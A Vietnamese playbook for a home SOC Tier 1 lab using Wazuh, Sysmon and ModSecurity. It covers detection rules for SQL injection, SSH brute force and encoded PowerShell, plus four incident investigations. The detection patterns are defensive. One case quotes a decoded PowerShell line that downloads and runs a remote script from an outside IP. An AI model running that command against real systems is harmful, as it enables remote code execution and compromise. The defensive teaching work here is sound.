# 📘 NHẬT KÝ XÂY DỰNG & VẬN HÀNH DỰ ÁN MY-SOC-LAB (PROJECT PLAYBOOK)
## Toàn bộ tiến trình kỹ thuật từ con số 0 đến làm chủ hệ thống SOC Tier 1

---

## 📑 MỤC LỤC
1. [Triết lý Thiết kế & Định hình Dự án từ Con số 0](#1-triết-lý-thiết-kế--định-hình-dự-án-từ-con-số-0)
2. [Thiết lập Hạ tầng Giám sát Từng Bước (Infrastructure Setup)](#2-thiết-lập-hạ-tầng-giám-sát-từng-bước-infrastructure-setup)
   - [2.1 Khởi tạo Cụm SIEM Wazuh Central](#21-khởi-tạo-cụm-siem-wazuh-central)
   - [2.2 Cấu hình Endpoint Windows (Sysmon + Wazuh Agent)](#22-cấu-hình-endpoint-windows-sysmon--wazuh-agent)
   - [2.3 Cấu hình Web Target Linux (Nginx + ModSecurity WAF + Auth Log)](#23-cấu-hình-web-target-linux-nginx--modsecurity-waf--auth-log)
3. [Thiết kế Logic Bắt Cảnh báo trên SIEM (`local_rules.xml`)](#3-thiết-kế-logic-bắt-cảnh-báo-trên-siem-local_rulesxml)
4. [Tự động hóa Làm giàu Dữ liệu Triage (`triage_ioc_checker.py`)](#4-tự-động-hóa-làm-giàu-dữ-liệu-triage-triage_ioc_checkerpy)
5. [Quy trình Thực thi & Điều tra 4 Ca trực Điển hình](#5-quy-trình-thực-thi--điều-tra-4-ca-trực-điển-hình)
   - [Ca 1: Tấn công Web OWASP SQLi & Đối chiếu WAF (True Positive)](#ca-1-tấn-công-web-owasp-sqli--đối-chiếu-waf-true-positive)
   - [Ca 2: SSH Brute Force & Xâm nhập qua Active Response (True Positive)](#ca-2-ssh-brute-force--xâm-nhập-qua-active-response-true-positive)
   - [Ca 3: Mã hóa PowerShell & Chiếm quyền Persistence (True Positive)](#ca-3-mã-hóa-powershell--chiếm-quyền-persistence-true-positive)
   - [Ca 4: Điều tra Cảnh báo Giả & Tinh chỉnh Luật (False Positive Tuning)](#ca-4-điều-tra-cảnh-báo-giả--tinh-chỉnh-luật-false-positive-tuning)
6. [Phương pháp Kiểm thử Xác thực (Testing Methodology)](#6-phương-pháp-kiểm-thử-xác-thực-testing-methodology)
7. [Bí quyết Làm chủ Hệ thống & Giải trình Kỹ thuật](#7-bí-quyết-làm-chủ-hệ-thống--giải-trình-kỹ-thuật)

---

## 1. TRIẾT LÝ THIẾT KẾ & ĐỊNH HÌNH DỰ ÁN TỪ CON SỐ 0

### 1.1 Vấn đề gặp phải ban đầu
Khi bắt tay xây dựng lab giám sát an ninh mạng, rất nhiều dự án rơi vào 2 cái bẫy:
- **Bẫy 1 - Làm giao diện web mô phỏng (Mock UI):** Tự code HTML/JS rồi nạp mảng dữ liệu cảnh báo tĩnh. Điều này biến dự án thành bài tập lập trình web chứ không phải môi trường SOC thực tế.
- **Bẫy 2 - Bị ngợp bởi hạ tầng DevOps:** Cố gắng dựng cụm Kubernetes, CI/CD, Kafka, Elastic đa cụm gây quá tải tài nguyên máy tính mà không tập trung vào việc đọc log và điều tra sự cố.

### 1.2 Quyết định kiến trúc của tôi
Tôi định hình lại toàn bộ hệ thống xoay quanh **Bản chất thật của SOC Tier 1**:
- **Log Generator (Hạ tầng sinh log thật):** 1 máy Windows chạy Sysmon và 1 máy Linux chạy Nginx/ModSecurity.
- **Log Collector & Processor (Thu thập & Xử lý):** Wazuh Agent đẩy log qua cổng TCP 1514 về Wazuh Manager.
- **Detection & Correlation (Luật phát hiện & Tương quan):** Viết trong `local_rules.xml` dựa trên MITRE ATT&CK.
- **Initial Triage & Automation:** Viết script Python tra cứu nhanh IOC qua API của AbuseIPDB và VirusTotal.
- **Deliverables (Sản phẩm đầu ra):** 4 bộ hồ sơ sự cố (Incident Reports) chuẩn ITSM kèm phương án xử lý ngắn hạn (Containment), dài hạn (Remediation) và kỹ thuật tinh chỉnh luật (Rule Tuning).

```
   [Windows Endpoint] ──(Sysmon / Security Logs)──┐
                                                  │
   [Linux Web Target] ──(Auth.log / ModSec CRS)───┼──► [Wazuh Manager (SIEM)] ──► [Wazuh Dashboard]
                                                  │            │
                                                  │     [Analysisd Engine]
                                                  │            │
                                                  │     [local_rules.xml]
                                                  │            │
                                                  └────► [Active Response] (Tự động drop IP)
```

---

## 2. THIẾT LẬP HẠ TẦNG GIÁM SÁT TỪNG BƯỚC (INFRASTRUCTURE SETUP)

### 2.1 Khởi tạo Cụm SIEM Wazuh Central
Tôi sử dụng Docker Compose để triển khai cụm Wazuh 4.7.2 chuẩn đơn nút (Single-Node), bao gồm:
1. `wazuh.manager`: Trái tim xử lý log, nạp decoders, đối chiếu rules và thực thi Active Response.
2. `wazuh.indexer`: Nền tảng OpenSearch lưu trữ và đánh chỉ mục (index) log sự kiện.
3. `wazuh.dashboard`: Giao diện web trực quan hóa hàng đợi cảnh báo (port 443).

Ánh xạ ổ đĩa trực tiếp từ file luật ngoài máy chủ vào trong container:
```yaml
volumes:
  - ../configurations/siem-rules/local_rules.xml:/var/ossec/etc/rules/local_rules.xml:ro
```
Mỗi lần chỉnh sửa luật phát hiện hoặc thêm luật loại trừ (Tuning), chỉ cần khởi động lại dịch vụ quản lý bằng lệnh:
```bash
docker exec -it deployment-wazuh.manager-1 /var/ossec/bin/wazuh-control restart
```

---

### 2.2 Cấu hình Endpoint Windows (Sysmon + Wazuh Agent)
Windows Event Viewer mặc định không ghi nhận chi tiết đối số dòng lệnh hoặc hàm băm tệp. Do đó, tôi triển khai Sysmon:

1. **Cài đặt Sysmon:**
   Sử dụng cấu hình chuẩn bảo mật từ cộng đồng tại `configurations/windows-agent/sysmonconfig.xml`:
   ```cmd
   sysmon.exe -accepteula -i configurations/windows-agent/sysmonconfig.xml
   ```
2. **Cấu hình đẩy log trong `configurations/windows-agent/ossec.conf`:**
   Kích hoạt đọc kênh sự kiện `Microsoft-Windows-Sysmon/Operational` và `Security`:
   ```xml
   <localfile>
     <location>Microsoft-Windows-Sysmon/Operational</location>
     <log_format>eventchannel</log_format>
   </localfile>
   <localfile>
     <location>Security</location>
     <log_format>eventchannel</log_format>
   </localfile>
   ```

---

### 2.3 Cấu hình Web Target Linux (Nginx + ModSecurity WAF + Auth Log)
Trên máy chủ Linux (Ubuntu/Debian), tôi tích hợp tường lửa ứng dụng web ModSecurity kèm bộ quy tắc OWASP Core Rule Set (CRS):

1. **Cấu hình ModSecurity:**
   Ghi nhận toàn bộ payload khả nghi vào `/var/log/modsecurity/modsec_audit.log` với chế độ `SecRuleEngine On`.
2. **Cấu hình thu thập trong `configurations/linux-web-agent/ossec.conf`:**
   ```xml
   <localfile>
     <log_format>syslog</log_format>
     <location>/var/log/auth.log</location>
   </localfile>
   <localfile>
     <log_format>apache</log_format>
     <location>/var/log/nginx/access.log</location>
   </localfile>
   <localfile>
     <log_format>apache</log_format>
     <location>/var/log/modsecurity/modsec_audit.log</location>
   </localfile>
   ```

---

## 3. THIẾT KẾ LOGIC BẮT CẢNH BÁO TRÊN SIEM (`local_rules.xml`)

Tệp `configurations/siem-rules/local_rules.xml` chứa 4 khối luật đại diện cho 4 ca trực:

### Khối 1: Bắt tấn công SQL Injection & Đối chiếu trạng thái WAF
- **Rule 100100 (Level 10):** Kế thừa dải luật web phân nhánh `31100, 31101, 31103, 31108` (đảm bảo không bị các luật mặc định của tệp `0250-web_rules.xml` phân loại trước làm nuốt mất sự kiện), sử dụng Regex PCRE2 quét chuỗi URI:
  ```xml
  <rule id="100100" level="10">
    <if_sid>31100, 31101, 31103, 31108</if_sid>
    <url type="pcre2">(?i)(\%27|\'|--|union\s+select|select\s+.*\s+from|or\s+1\=1|waitfor\s+delay)</url>
    <description>Web Attack: SQL Injection attempt detected on web application URI</description>
  </rule>
  ```
- **Rule 100101 (Level 6):** Kế thừa Rule 100100, bắt mã HTTP `403` khi WAF chặn thành công.
- **Rule 100102 (Level 12):** Kế thừa Rule 100100, bắt mã HTTP `200` báo động đỏ khi payload lọt qua phòng tuyến.

### Khối 2: Bắt Brute Force SSH & Tương quan Đăng nhập Thành công
- **Rule 100201 (Level 10):** Khai báo `<if_matched_sid>5710, 5716</if_matched_sid>` để bao quát cả trường hợp dò mật khẩu vào tài khoản không tồn tại (SID 5710) lẫn tài khoản có thật như root/ubuntu (SID 5716):
  ```xml
  <rule id="100201" level="10" frequency="5" timeframe="60">
    <if_matched_sid>5710, 5716</if_matched_sid>
    <same_source_ip />
    <description>Brute Force: Multiple SSH authentication failures from single IP</description>
  </rule>
  ```
- **Rule 100202 (Level 13 - Critical):** Luật tương quan chuỗi: Nếu xảy ra luật `5715` (SSHD accepted password) ngay sau khi IP đó vừa kích hoạt Rule `100201`, cảnh báo tài khoản bị chiếm quyền.

### Khối 3: Bắt Suspicious PowerShell & Persistence Run Key
- **Rule 100301 (Level 10):** Kế thừa Sysmon Process Create `61603`, kiểm tra `originalFileName` là `powershell.exe` và `commandLine` chứa tham số che giấu hoặc vượt rào chính sách:
  ```xml
  <rule id="100301" level="10">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.originalFileName" type="pcre2">(?i)powershell\.exe</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\s+-(e|en|enc|encoded|encodedcommand)\s+|-executionpolicy\s+bypass)</field>
  </rule>
  ```
- **Rule 100302 (Level 10):** Kế thừa đúng mã SID của Sysmon Event ID 13 (Registry Value Set) là `61615`:
  ```xml
  <rule id="100302" level="10">
    <if_sid>61615</if_sid>
    <field name="win.eventdata.targetObject" type="pcre2">(?i)CurrentVersion\\Run</field>
  </rule>
  ```

### Khối 4: Luật Tinh chỉnh Loại trừ (Rule Tuning)
- **Rule 100401 (Level 0):**
  ```xml
  <rule id="100401" level="0">
    <if_sid>100301</if_sid>
    <field name="win.eventdata.user" type="pcre2">(?i)^DOMAIN\\svc_backup$</field>
    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\svchost\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)Backup_Routine\.ps1</field>
    <description>Tuning: Whitelist authorized IT Backup Service account</description>
  </rule>
  ```

---

## 4. TỰ ĐỘNG HÓA LÀM GIÀU DỮ LIỆU TRIAGE (`triage_ioc_checker.py`)

Công cụ dòng lệnh `scripts/triage_ioc_checker.py` hỗ trợ bước Initial Triage:
- Viết bằng Python thuần (`urllib.request` và `json`), không cần cài đặt thêm thư viện phụ thuộc.
- Tự động nhận diện IPv4 hoặc File Hash (MD5/SHA256).
- Kết nối trực tiếp API của AbuseIPDB và VirusTotal.
- Có cơ chế kiểm thử ngoại tuyến tự động trả kết quả mẫu khi không có internet hoặc chưa nạp API key.

```bash
python scripts/triage_ioc_checker.py -i 203.0.113.45
python scripts/triage_ioc_checker.py -f 44d88612fea8a8f36de82e1278abb02f
```

---

## 5. QUY TRÌNH THỰC THI & ĐIỀU TRA 4 CA TRỰC ĐIỂN HÌNH

### Ca 1: Tấn công Web OWASP SQLi & Đối chiếu WAF (True Positive)
- **Nguồn dữ liệu:** Bộ kiểm thử chuẩn của `coreruleset/coreruleset` và `splunk/attack_data` (T1190).
- **Phân tích:** Request mang mã `403` do ModSecurity chặn (Rule 942100). Request trước đó mang mã `200` chứng tỏ kẻ tấn công đã từng thăm dò thành công khi chưa bật luật.
- **Hồ sơ:** `incident-reports/Case-01-OWASP-SQLi-and-WAF-Triage.md`.

### Ca 2: SSH Brute Force & Xâm nhập qua Active Response (True Positive)
- **Nguồn dữ liệu:** Tệp `OpenSSH_2k.log` trên kho `logpai/loghub` và `splunk/attack_data` (T1110.001).
- **Phân tích:** Chuỗi thất bại kích hoạt Rule `100201`, gọi lệnh khóa IP của Active Response (`firewall-drop.sh`). Đồng thời ghi nhận đăng nhập thành công ngay trước khi kết nối TCP bị ngắt hẳn (`Accepted password for devops`).
- **Hành động:** Ngắt phiên SSH ngay lập tức (`pkill -u devops`), khóa tài khoản (`passwd -l devops`).
- **Hồ sơ:** `incident-reports/Case-02-SSH-BruteForce-ActiveResponse.md`.

### Ca 3: Mã hóa PowerShell & Chiếm quyền Persistence (True Positive)
- **Nguồn dữ liệu:** Dự án `OTRF/Security-Datasets` (Mordor) và `sbousseaden/EVTX-ATTACK-SAMPLES` (T1059.001 & T1547.001).
- **Phân tích:** Sysmon Event ID 1 ghi nhận PowerShell chạy chuỗi Base64. Giải mã UTF-16LE phát hiện lệnh `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')`. Sysmon Event ID 13 ghi nhận khóa khởi động tại `HKCU\...\Run\WindowsUpdateCheck`.
- **Hành động:** Cô lập máy trạm, dừng tiến trình, xóa khóa Registry và tệp độc hại.
- **Hồ sơ:** `incident-reports/Case-03-Windows-Encoded-PowerShell-Persistence.md`.

### Ca 4: Điều tra Cảnh báo Giả & Tinh chỉnh Luật (False Positive Tuning)
- **Nguồn dữ liệu:** Bản ghi thực tế từ kênh `Microsoft-Windows-Sysmon/Operational` trên Windows 10.
- **Phân tích:** Tiến trình `powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -File "C:\Program Files\IT-Management\Backup_Routine.ps1"` được gọi bởi tiến trình cha `C:\Windows\System32\svchost.exe` (`svchost.exe -k netsvcs -p -s Schedule`) dưới danh nghĩa `DOMAIN\svc_backup`. Hoạt động khớp với Change Ticket `#CHG-8921`.
- **Hành động:** Thiết lập Rule `100401` với `level="0"` loại trừ cảnh báo giả, triệt tiêu Alert Fatigue.
- **Hồ sơ:** `incident-reports/Case-04-False-Positive-Alert-Tuning.md`.

---

## 6. PHƯƠNG PHÁP KIỂM THỬ XÁC THỰC (TESTING METHODOLOGY)

Hệ thống áp dụng 2 cơ chế kiểm thử chuyên biệt phù hợp với đặc thù từng định dạng log:
1. **Kiểm thử log dạng văn bản (Linux auth.log, Nginx access.log):** Sử dụng công cụ `wazuh-logtest` tích hợp trong Wazuh Manager:
   ```bash
   docker exec -it deployment-wazuh.manager-1 /var/ossec/bin/wazuh-logtest
   ```
   Dán dòng log thô để quan sát 3 giai đoạn Pre-decoding, Decoding và Rule Matching.
2. **Kiểm thử log Windows Sysmon (EventChannel):** Log Sysmon gửi từ Agent qua kênh `windows_eventchannel` có cấu trúc trường phân nhánh (`win.system.eventID`, `win.eventdata.*`). Việc xác minh được thực hiện qua luồng Agent thực tế hoặc kiểm tra đối chiếu qua tệp nhật ký `archives.json` trong container thay vì dán chuỗi JSON phẳng vào `wazuh-logtest`.

---

## 7. BÍ QUYẾT LÀM CHỦ HỆ THỐNG & GIẢI TRÌNH KỸ THUẬT

1. **Tại sao lại dùng PowerShell UTF-16LE thay vì UTF-8 khi giải mã?**
   Windows PowerShell được xây dựng trên .NET Framework, quy chuẩn chuỗi ký tự bên trong của PowerShell là Unicode UTF-16LE (Little Endian, 2 byte/ký tự). Nếu dùng decoder UTF-8 thông thường, các ký tự sẽ bị xen kẽ các byte null (`\x00`), dẫn đến việc đọc chuỗi bị lỗi.

2. **Sự khác nhau giữa việc xóa một Rule và việc đặt `level="0"` (Rule Tuning) là gì?**
   Nếu xóa Rule mẹ (`100301`), toàn bộ hệ thống sẽ bị mù đối với kỹ thuật tấn công đó. Khi đặt `level="0"` cho Rule con (`100401`) kế thừa qua `<if_sid>`, Wazuh chỉ bỏ qua cảnh báo khi thỏa mãn đồng thời cả tài khoản hợp lệ (`DOMAIN\svc_backup`), tiến trình cha hợp lệ (`svchost.exe`) và tệp script hợp lệ (`Backup_Routine.ps1`). Nếu hacker tấn công dùng PowerShell dưới quyền user khác, Rule `100301` vẫn nổ chuông cảnh báo bình thường.

3. **Tại sao Rule 100100 cần khai báo nhiều SID (`31100, 31101, 31103, 31108`)?**
   Trong bộ luật mặc định của Wazuh (`0250-web_rules.xml`), một dòng log web Nginx/Apache khi đi vào hệ thống sẽ được phân nhánh tự động: mã lỗi 4xx đi vào 31101, mã 200 đi vào 31108, chuỗi SQLi mặc định đi vào 31103. Nếu chỉ để `<if_sid>31100</if_sid>`, các sự kiện đã bị phân nhánh sẽ không bao giờ khớp với luật custom trong `local_rules.xml`.
